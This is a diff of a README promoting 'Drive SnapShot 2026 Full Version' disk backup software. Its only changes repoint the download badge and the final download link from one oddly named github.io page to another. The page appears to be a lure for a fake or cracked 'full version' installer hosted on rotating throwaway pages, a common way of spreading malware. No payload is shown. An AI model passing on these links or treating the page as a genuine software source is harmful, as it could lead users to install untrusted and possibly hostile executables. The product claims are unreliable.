@@ -2,7 +2,7 @@
 
 Drive SnapShot 2026 Full Version is a robust disk imaging and backup software tailored for Windows 10 and Windows 11 users. This tool provides comprehensive data protection by allowing you to create precise snapshots of your entire system or individual drives. Whether for personal use or business environments, Drive SnapShot ensures your data is safe and recoverable.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ A: Drive SnapShot saves backups in its proprietary image format (.SNAP), which i
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
